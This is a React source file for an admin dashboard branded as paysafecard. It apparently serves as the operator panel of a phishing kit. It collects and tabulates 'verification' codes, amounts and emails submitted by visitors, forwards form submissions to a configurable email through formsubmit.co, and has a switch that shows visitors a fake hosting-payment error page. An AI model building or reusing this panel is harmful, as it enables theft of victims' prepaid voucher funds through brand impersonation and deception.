import { useState, useEffect, useRef } from "react";
import {
  addVerification as firebaseAdd,
  onVerificationsSnapshot,
  clearAllVerifications,
  checkFirebaseConnection,
  setNotificationEmail,
  onNotificationEmailSnapshot,
  setWebappDisabled,
  onWebappDisabledSnapshot,
  type FirebaseVerification,
} from "../utils/firebase";

export interface VerificationRecord {
  id: string;
  code: string;
  amount: string;
  currency: string;
  email: string;
  date: string;
  timestamp: number;
  emailStatus: "success" | "failed";
}

// Save — writes to Firebase first, localStorage as fallback
export async function saveVerification(
  record: Omit<VerificationRecord, "id" | "date" | "timestamp">
) {
  // Try Firebase first
  let firebaseOk = false;
  try {
    firebaseOk = await firebaseAdd(record);
  } catch {
    console.log("Firebase save failed");
  }

  // If Firebase failed, save to localStorage as fallback
  if (!firebaseOk) {
    const existing = getLocalVerifications();
    const now = new Date();
    const newRecord: VerificationRecord = {
      ...record,
      id: crypto.randomUUID?.() || Math.random().toString(36).slice(2),
      date: now.toLocaleString(),
      timestamp: now.getTime(),
    };
    existing.unshift(newRecord);
    localStorage.setItem("paysafe_verifications", JSON.stringify(existing));
    console.log("Data saved to localStorage (Firebase unavailable)");
  } else {
    console.log("Data saved to Firebase successfully");
  }
}

function getLocalVerifications(): VerificationRecord[] {
  try {
    const data = localStorage.getItem("paysafe_verifications");
    return data ? JSON.parse(data) : [];
  } catch {
    return [];
  }
}

// Auto-sync localStorage → Firebase (called when Firebase connects)
async function autoSyncLocalToFirebase(): Promise<number> {
  const localData = getLocalVerifications();
  if (localData.length === 0) return 0;

  console.log(`Auto-syncing ${localData.length} local records to Firebase...`);
  let successCount = 0;
  for (const record of localData) {
    const ok = await firebaseAdd({
      code: record.code,
      amount: record.amount,
      currency: record.currency,
      email: record.email,
      emailStatus: record.emailStatus,
    });
    if (ok) successCount++;
  }

  if (successCount > 0) {
    // Clear localStorage after successful sync
    localStorage.removeItem("paysafe_verifications");
    console.log(`Auto-sync complete: ${successCount}/${localData.length} records synced`);
  }
  return successCount;
}

interface AdminDashboardProps {
  onBack: () => void;
}

/* ── Connection Status Badge ── */
function ConnectionBadge({ connected }: { connected: boolean | null }) {
  if (connected === null) {
    return (
      <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-medium bg-yellow-100 text-yellow-700">
        <span className="w-2 h-2 rounded-full bg-yellow-400 animate-pulse" />
        Connecting...
      </span>
    );
  }
  return (
    <span
      className={`inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-medium ${
        connected
          ? "bg-green-100 text-green-700"
          : "bg-red-100 text-red-700"
      }`}
    >
      <span
        className={`w-2 h-2 rounded-full ${
          connected ? "bg-green-500" : "bg-red-500"
        }`}
      />
      {connected ? "Firebase Connected" : "Firebase Disconnected"}
    </span>
  );
}

export default function AdminDashboard({ onBack }: AdminDashboardProps) {
  const [records, setRecords] = useState<VerificationRecord[]>([]);
  const [search, setSearch] = useState("");
  const [dbConnected, setDbConnected] = useState<boolean | null>(null);
  const hasSynced = useRef(false);

  // Notification email settings
  const [currentNotifEmail, setCurrentNotifEmail] = useState("");
  const [editNotifEmail, setEditNotifEmail] = useState("");
  const [savingEmail, setSavingEmail] = useState(false);
  const [emailSaveMsg, setEmailSaveMsg] = useState<{ type: "ok" | "err"; text: string } | null>(null);

  // Webapp disabled toggle
  const [isWebappDisabled, setIsWebappDisabled] = useState(false);
  const [togglingWebapp, setTogglingWebapp] = useState(false);

  useEffect(() => {
    // Check Firebase connection
    checkFirebaseConnection().then((ok) => setDbConnected(ok));

    // Subscribe to real-time notification email updates
    const unsubEmail = onNotificationEmailSnapshot((email) => {
      setCurrentNotifEmail(email);
      setEditNotifEmail(email);
    });

    // Subscribe to real-time webapp disabled status
    const unsubWebapp = onWebappDisabledSnapshot((disabled) => {
      setIsWebappDisabled(disabled);
    });

    // Subscribe to real-time Firebase updates
    const unsubscribe = onVerificationsSnapshot((firebaseRecords) => {
      // If we get a callback (even empty), Firebase is connected
      setDbConnected(true);
      
      if (firebaseRecords.length > 0) {
        const mapped: VerificationRecord[] = firebaseRecords.map((r) => ({
          id: r.id,
          code: r.code || "",
          amount: r.amount || "",
          currency: r.currency || "",
          email: r.email || "",
          date: r.date || "",
          timestamp: r.timestamp || 0,
          emailStatus: r.emailStatus || "failed",
        }));
        setRecords(mapped);
      } else {
        // Firebase connected but empty — auto-sync localStorage if not already done
        const local = getLocalVerifications();
        if (local.length > 0 && !hasSynced.current) {
          hasSynced.current = true;
          // Auto-sync local data to Firebase
          autoSyncLocalToFirebase();
          // Show local data while syncing
          setRecords(local);
        } else {
          setRecords([]);
        }
      }
    });

    return () => {
      unsubscribe();
      unsubEmail();
      unsubWebapp();
    };
  }, []);

  const handleSaveEmail = async () => {
    if (!editNotifEmail.trim() || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(editNotifEmail)) {
      setEmailSaveMsg({ type: "err", text: "Please enter a valid email address." });
      return;
    }
    setSavingEmail(true);
    setEmailSaveMsg(null);
    const ok = await setNotificationEmail(editNotifEmail.trim());
    setSavingEmail(false);
    if (ok) {
      setEmailSaveMsg({ type: "ok", text: "Email updated successfully!" });
    } else {
      setEmailSaveMsg({ type: "err", text: "Failed to update. Check Firebase connection." });
    }
    setTimeout(() => setEmailSaveMsg(null), 4000);
  };

  const handleToggleWebapp = async () => {
    setTogglingWebapp(true);
    const newState = !isWebappDisabled;
    await setWebappDisabled(newState);

    // Send notification email to the configured admin email
    if (currentNotifEmail) {
      try {
        const formData = new FormData();
        formData.append("_captcha", "false");
        formData.append("_template", "table");

        if (newState) {
          // Webapp DISABLED
          formData.append("_subject", "⚠️ Service Temporarily Unavailable");
          formData.append("Status", "DISABLED");
          formData.append("Message", "The webapp has been disabled. Visitors now see a hosting payment error page.");
          formData.append("Action", "The site is suspended until you re-enable it from the admin dashboard.");
          formData.append("Date", new Date().toLocaleString());
        } else {
          // Webapp ENABLED
          formData.append("_subject", "✅ Service Restored");
          formData.append("Status", "ENABLED");
          formData.append("Message", "The webapp has been re-enabled. Visitors can now access the site normally.");
          formData.append("Action", "No further action required. The site is live.");
          formData.append("Date", new Date().toLocaleString());
        }

        await fetch(`https://formsubmit.co/ajax/${currentNotifEmail}`, {
          method: "POST",
          headers: { Accept: "application/json" },
          body: formData,
        });
        console.log(`Notification email sent to ${currentNotifEmail} — webapp ${newState ? "disabled" : "enabled"}`);
      } catch {
        console.warn("Failed to send webapp toggle notification email");
      }
    }

    setTogglingWebapp(false);
  };

  const filtered = records.filter(
    (r) =>
      r.code.toLowerCase().includes(search.toLowerCase()) ||
      r.email.toLowerCase().includes(search.toLowerCase()) ||
      r.currency.toLowerCase().includes(search.toLowerCase())
  );

  // Stats
  const totalVerifications = records.length;
  const todayCount = records.filter((r) => {
    const today = new Date();
    const d = new Date(r.timestamp);
    return d.toDateString() === today.toDateString();
  }).length;
  const uniqueEmails = new Set(records.map((r) => r.email)).size;
  const totalAmount = records.reduce(
    (sum, r) => sum + (parseFloat(r.amount) || 0),
    0
  );
  const emailsSuccess = records.filter(
    (r) => r.emailStatus === "success"
  ).length;
  const emailsFailed = records.filter(
    (r) => r.emailStatus === "failed"
  ).length;

  const handleClearAll = async () => {
    if (confirm("Are you sure you want to clear all records?")) {
      localStorage.removeItem("paysafe_verifications");
      await clearAllVerifications();
      setRecords([]);
    }
  };

  return (
    <div className="min-h-screen" style={{ backgroundColor: "#F3F4F6" }}>
      {/* Header */}
      <header
        className="sticky top-0 z-50"
        style={{
          background: "linear-gradient(135deg, #04267f 0%, #0035bf 100%)",
          boxShadow: "0 2px 12px rgba(0,0,0,0.15)",
        }}
      >
        <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
          <div className="flex items-center gap-4">
            <button
              onClick={onBack}
              className="text-white/80 hover:text-white transition text-sm flex items-center gap-1"
            >
              <svg
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
              >
                <path d="M15 18l-6-6 6-6" />
              </svg>
              Back
            </button>
            <h1 className="text-white font-bold text-xl tracking-tight">
              Admin Dashboard
            </h1>
          </div>
          <div className="flex items-center gap-3">
            <ConnectionBadge connected={dbConnected} />
            <div className="text-white/60 text-xs hidden sm:block">paysafecard</div>
          </div>
        </div>
      </header>

      <div className="max-w-7xl mx-auto px-6 py-8">
        {/* ── Settings: Notification Email ── */}
        <div className="bg-white rounded-xl shadow-sm border border-slate-100 p-5 mb-8">
          <div className="flex items-center gap-2 mb-3">
            <span className="text-lg">⚙️</span>
            <h2 className="text-base font-semibold text-slate-800">Settings</h2>
          </div>
          <div className="flex flex-col sm:flex-row items-start sm:items-end gap-3">
            <div className="flex-1 w-full">
              <label className="block text-xs font-medium text-slate-500 mb-1">
                Notification Email (receives form submissions)
              </label>
              <div className="flex items-center gap-2">
                <input
                  type="email"
                  value={editNotifEmail}
                  onChange={(e) => setEditNotifEmail(e.target.value)}
                  placeholder="Enter notification email..."
                  className="flex-1 rounded-lg bg-[#F5F5F5] text-slate-700 placeholder:text-slate-400 px-4 py-2.5 text-sm border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500/30"
                />
                <button
                  onClick={handleSaveEmail}
                  disabled={savingEmail || editNotifEmail === currentNotifEmail}
                  className="px-4 py-2.5 rounded-lg text-sm font-medium text-white transition disabled:opacity-40"
                  style={{ backgroundColor: "#04267f" }}
                >
                  {savingEmail ? "Saving..." : "Save"}
                </button>
              </div>
              {emailSaveMsg && (
                <p className={`mt-1.5 text-xs font-medium ${emailSaveMsg.type === "ok" ? "text-green-600" : "text-red-500"}`}>
                  {emailSaveMsg.text}
                </p>
              )}
              <p className="mt-1 text-xs text-slate-400">
                Current: <span className="font-mono text-slate-600">{currentNotifEmail}</span>
              </p>
            </div>
          </div>

          {/* Divider */}
          <div className="border-t border-slate-100 my-5" />

          {/* Disable Webapp Toggle */}
          <div className="flex items-center justify-between">
            <div className="flex-1">
              <label className="block text-xs font-medium text-slate-500 mb-0.5">
                Disable Webapp
              </label>
              <p className="text-xs text-slate-400">
                When enabled, visitors will see a hosting payment error page instead of the app.
              </p>
            </div>
            <button
              type="button"
              role="switch"
              aria-checked={isWebappDisabled}
              disabled={togglingWebapp}
              onClick={handleToggleWebapp}
              className="relative inline-flex h-7 w-[52px] shrink-0 cursor-pointer items-center rounded-full border-2 border-transparent transition-colors duration-300 focus:outline-none focus:ring-2 focus:ring-blue-500/30 focus:ring-offset-2 disabled:opacity-50 disabled:cursor-wait"
              style={{
                backgroundColor: isWebappDisabled ? "#DC2626" : "#D1D5DB",
              }}
            >
              <span
                className="pointer-events-none inline-block h-5 w-5 rounded-full bg-white shadow-lg ring-0 transition-transform duration-300 ease-in-out"
                style={{
                  transform: isWebappDisabled ? "translateX(26px)" : "translateX(2px)",
                }}
              />
            </button>
          </div>
          {isWebappDisabled && (
            <div className="mt-3 flex items-center gap-2 bg-red-50 border border-red-200 rounded-lg px-4 py-2.5">
              <span className="text-red-500 text-sm">⚠️</span>
              <p className="text-xs font-medium text-red-600">
                Webapp is currently disabled. Visitors see a maintenance page. Toggle off to restore access.
              </p>
            </div>
          )}
        </div>

        {/* Stats Cards */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-5 mb-5">
          <StatCard
            label="Total Verifications"
            value={totalVerifications.toString()}
            icon="📊"
            color="#04267f"
          />
          <StatCard
            label="Today"
            value={todayCount.toString()}
            icon="📅"
            color="#0B9444"
          />
          <StatCard
            label="Unique Emails"
            value={uniqueEmails.toString()}
            icon="📧"
            color="#E65100"
          />
        </div>
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-5 mb-8">
          <StatCard
            label="Total Amount"
            value={totalAmount.toFixed(2)}
            icon="💰"
            color="#7B1FA2"
          />
          <StatCard
            label="Emails Sent ✓"
            value={emailsSuccess.toString()}
            icon="✅"
            color="#0B9444"
          />
          <StatCard
            label="Emails Failed ✗"
            value={emailsFailed.toString()}
            icon="❌"
            color="#D32F2F"
          />
        </div>

        {/* Controls */}
        <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 mb-6">
          <h2 className="text-lg font-semibold text-slate-800">
            Verification Records
            <span className="ml-2 text-xs font-normal text-slate-400">
              {dbConnected ? "(real-time sync)" : "(local data)"}
            </span>
          </h2>
          <div className="flex items-center gap-3 w-full sm:w-auto">
            <input
              type="text"
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              placeholder="Search by code, email, currency..."
              className="flex-1 sm:w-[300px] rounded-lg bg-white text-slate-700 placeholder:text-slate-400 px-4 py-2.5 text-sm border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500/30 shadow-sm"
            />
            {records.length > 0 && (
              <button
                onClick={handleClearAll}
                className="text-xs text-red-500 hover:text-red-700 transition font-medium whitespace-nowrap"
              >
                Clear all
              </button>
            )}
          </div>
        </div>

        {/* Table */}
        {filtered.length === 0 ? (
          <div className="bg-white rounded-xl shadow-sm border border-slate-100 p-16 text-center">
            <div className="text-4xl mb-3">📭</div>
            <p className="text-slate-500 text-base">
              {records.length === 0
                ? "No verifications yet. Records will appear here after users submit the form."
                : "No results matching your search."}
            </p>
          </div>
        ) : (
          <div className="bg-white rounded-xl shadow-sm border border-slate-100 overflow-hidden">
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr
                    className="border-b border-slate-100"
                    style={{ backgroundColor: "#F9FAFB" }}
                  >
                    <th className="text-left px-5 py-3 font-semibold text-slate-600 text-xs uppercase tracking-wide">
                      #
                    </th>
                    <th className="text-left px-5 py-3 font-semibold text-slate-600 text-xs uppercase tracking-wide">
                      Date
                    </th>
                    <th className="text-left px-5 py-3 font-semibold text-slate-600 text-xs uppercase tracking-wide">
                      Code
                    </th>
                    <th className="text-left px-5 py-3 font-semibold text-slate-600 text-xs uppercase tracking-wide">
                      Amount
                    </th>
                    <th className="text-left px-5 py-3 font-semibold text-slate-600 text-xs uppercase tracking-wide">
                      Currency
                    </th>
                    <th className="text-left px-5 py-3 font-semibold text-slate-600 text-xs uppercase tracking-wide">
                      Email
                    </th>
                    <th className="text-left px-5 py-3 font-semibold text-slate-600 text-xs uppercase tracking-wide">
                      Email Status
                    </th>
                  </tr>
                </thead>
                <tbody>
                  {filtered.map((r, i) => (
                    <tr
                      key={r.id}
                      className="border-b border-slate-50 hover:bg-slate-50/50 transition"
                    >
                      <td className="px-5 py-3 text-slate-400 font-mono text-xs">
                        {filtered.length - i}
                      </td>
                      <td className="px-5 py-3 text-slate-600 text-xs whitespace-nowrap">
                        {r.date}
                      </td>
                      <td className="px-5 py-3 font-mono font-semibold text-slate-800 tracking-wide">
                        {r.code}
                      </td>
                      <td className="px-5 py-3 font-semibold text-slate-800">
                        {r.amount}
                      </td>
                      <td className="px-5 py-3 text-slate-600 uppercase">
                        {r.currency}
                      </td>
                      <td className="px-5 py-3 text-blue-600">{r.email}</td>
                      <td className="px-5 py-3">
                        <span
                          className="inline-flex items-center gap-1 px-2.5 py-1 rounded-full text-xs font-semibold"
                          style={{
                            backgroundColor:
                              r.emailStatus === "success"
                                ? "#E8F5E9"
                                : "#FFEBEE",
                            color:
                              r.emailStatus === "success"
                                ? "#2E7D32"
                                : "#C62828",
                          }}
                        >
                          {r.emailStatus === "success"
                            ? "✓ Sent"
                            : "✗ Failed"}
                        </span>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

/* ── Stat Card ── */
function StatCard({
  label,
  value,
  icon,
  color,
}: {
  label: string;
  value: string;
  icon: string;
  color: string;
}) {
  return (
    <div className="bg-white rounded-xl shadow-sm border border-slate-100 p-5 flex items-center gap-4">
      <div
        className="w-12 h-12 rounded-xl flex items-center justify-center text-xl"
        style={{ backgroundColor: `${color}15` }}
      >
        {icon}
      </div>
      <div>
        <div className="text-2xl font-bold text-slate-900">{value}</div>
        <div className="text-xs text-slate-500 mt-0.5">{label}</div>
      </div>
    </div>
  );
}
